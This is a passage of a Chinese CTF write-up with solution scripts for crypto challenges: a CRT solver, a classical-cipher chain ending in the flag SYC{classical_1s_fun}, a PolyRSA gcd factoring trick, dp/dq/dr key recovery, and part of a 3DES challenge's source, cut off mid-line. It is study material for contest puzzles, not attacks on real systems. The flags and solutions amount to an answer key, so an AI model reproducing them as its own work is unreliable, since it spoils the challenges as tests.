class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\"># 计算部分解密结果</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        result <span class=\"token operator\">+=</span> c<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> Ni <span class=\"token operator\">*</span> Mi</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token comment\"># 取最小正整数解</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    flag <span class=\"token operator\">=</span> result <span class=\"token operator\">%</span> N</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">return</span> long_to_bytes<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">58657</span><span class=\"token punctuation\">,</span> <span class=\"token number\">47093</span><span class=\"token punctuation\">,</span> <span class=\"token number\">47963</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41213</span><span class=\"token punctuation\">,</span> <span class=\"token number\">57653</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56923</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41809</span><span class=\"token punctuation\">,</span> <span class=\"token number\">49639</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44417</span><span class=\"token punctuation\">,</span> <span class=\"token number\">38639</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39857</span><span class=\"token punctuation\">,</span> <span class=\"token number\">53609</span><span class=\"token punctuation\">,</span> <span class=\"token number\">55621</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41729</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60497</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44647</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39703</span><span class=\"token punctuation\">,</span> <span class=\"token number\">55117</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44111</span><span class=\"token punctuation\">,</span> <span class=\"token number\">57131</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37747</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63419</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63703</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64007</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46349</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39241</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39313</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44909</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40763</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46727</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34057</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56333</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>c<span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">36086</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4005</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3350</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23179</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34246</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5145</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32490</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16348</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13628</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7742</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46317</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50824</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23718</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32995</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7640</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10590</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46897</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39245</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16633</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31488</span><span class=\"token punctuation\">,</span> <span class=\"token number\">36547</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42136</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52782</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31929</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34747</span><span class=\"token punctuation\">,</span> <span class=\"token number\">29026</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18748</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6634</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9700</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8126</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5197</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>flag <span class=\"token operator\">=</span> chinese_remainder_theorem<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"easy_classic\"><a class=\"markdownIt-Anchor\" href=\"#easy_classic\">#</a> easy_classic</h3>\n<p>古典密码的套</p>\n<p>第一层： udzeojxuwqcu</p>\n<p>凯撒 16：enjoythegame</p>\n<p>第二层：ialhhooavtepcyr</p>\n<p>栅栏 7：ilovecryptohaha</p>\n<p>第三层：5a6H5a6Z5LiH5rOV55qE6YKj5Liq5rqQ5aS0</p>\n<p>base64: 宇宙万法的那个源头</p>\n<p>第四层：呋食食食取噗山笨笨破嗄咯哈動嗡雜類嗒嘿啽沒歡破吖咬我啽寶盜噔咯沒</p>\n<p>熊曰解密：never gonna give you up</p>\n<p>第五层：👝👘👠👩👞👘👤👜</p>\n<p>base100 找 key:fairgame</p>\n<p>根据 fairgame 得知加密为 Playfair：genshinstart</p>\n<pre><code>SYC&#123;classical_1s_fun&#125;\n</code></pre>\n<h3 id=\"polyrsa\"><a class=\"markdownIt-Anchor\" href=\"#polyrsa\">#</a> PolyRSA</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> math</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> inverse</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e1 <span class=\"token operator\">=</span> <span class=\"token number\">113717</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>e2 <span class=\"token operator\">=</span> <span class=\"token number\">80737</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>c1 <span class=\"token operator\">=</span> <span class=\"token number\">97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>c2 <span class=\"token operator\">=</span> <span class=\"token number\">353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>q <span class=\"token operator\">=</span> math<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span> e2<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>e1<span class=\"token operator\">*</span>e2<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span> e1<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>e1<span class=\"token operator\">*</span>e2<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p <span class=\"token operator\">=</span> n <span class=\"token operator\">//</span> q</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>d <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"fi1nd_th3_x\"><a class=\"markdownIt-Anchor\" href=\"#fi1nd_th3_x\">#</a> Fi1nd_th3_x’</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> functools <span class=\"token keyword\">import</span> <span class=\"token builtin\">reduce</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span> <span class=\"token number\">13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>q<span class=\"token operator\">=</span> <span class=\"token number\">12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r<span class=\"token operator\">=</span> <span class=\"token number\">12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>dp<span class=\"token operator\">=</span> <span class=\"token number\">116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>dq<span class=\"token operator\">=</span> <span class=\"token number\">44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>dr<span class=\"token operator\">=</span> <span class=\"token number\">60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>c<span class=\"token operator\">=</span> <span class=\"token number\">93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">union</span><span class=\"token punctuation\">(</span>x1<span class=\"token punctuation\">,</span> x2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    a1<span class=\"token punctuation\">,</span> m1 <span class=\"token operator\">=</span> x1</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    a2<span class=\"token punctuation\">,</span> m2 <span class=\"token operator\">=</span> x2</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">,</span> m2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">assert</span> <span class=\"token punctuation\">(</span>a2 <span class=\"token operator\">-</span> a1<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> d <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    p1<span class=\"token punctuation\">,</span>p2 <span class=\"token operator\">=</span> m1 <span class=\"token operator\">//</span> d<span class=\"token punctuation\">,</span>m2 <span class=\"token operator\">//</span> d</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    _<span class=\"token punctuation\">,</span>l1<span class=\"token punctuation\">,</span>l2 <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>gcdext<span class=\"token punctuation\">(</span>p1<span class=\"token punctuation\">,</span>p2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    k <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>a1 <span class=\"token operator\">-</span> a2<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> d<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> l1</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    lcm <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>lcm<span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">,</span>m2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    ans <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>a1 <span class=\"token operator\">+</span> k <span class=\"token operator\">*</span> m1<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> lcm</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> ans<span class=\"token punctuation\">,</span>lcm</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">excrt</span><span class=\"token punctuation\">(</span>ai<span class=\"token punctuation\">,</span>mi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    tmp <span class=\"token operator\">=</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>ai<span class=\"token punctuation\">,</span>mi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">reduce</span><span class=\"token punctuation\">(</span>union<span class=\"token punctuation\">,</span> tmp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>mi <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>r <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>r <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>ai <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>dp<span class=\"token punctuation\">,</span>dq<span class=\"token punctuation\">,</span>dr<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>d<span class=\"token punctuation\">,</span>lcm <span class=\"token operator\">=</span> excrt<span class=\"token punctuation\">(</span>ai<span class=\"token punctuation\">,</span>mi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q <span class=\"token operator\">*</span> r</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"simple3des\"><a class=\"markdownIt-Anchor\" href=\"#simple3des\">#</a> Simple3DES</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> DES3</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>xor <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">:</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> b<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">max</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pad <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> msg<span class=\"token punctuation\">,</span>padlen<span class=\"token punctuation\">:</span> msg<span class=\"token operator\">+</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>padlen<span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>padlen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>padlen<span class=\"token operator\">-</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>padlen<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>flag <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>environ<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"FLAG\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"SYC&#123;Al3XEI_FAKE_FLAG&#125;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sec <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>banner <span class=\"token operator\">=</span> <span class=\"token string\">'|'</span><span class=\"token operator\">*</span><span class=\"token number\">70</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>DEBUG <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span> </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">proof_of_work</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    proof <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>random<span class=\"token punctuation\">.</span>choice<span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">.</span>ascii_letters<span class=\"token operator\">+</span>string<span class=\"token punctuation\">.</span>digits<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    digest <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span>proof<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sha256(XXXX+%s) == %s\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>proof<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> digest<span class=\"token punctuation\">)</span><span class=\"token 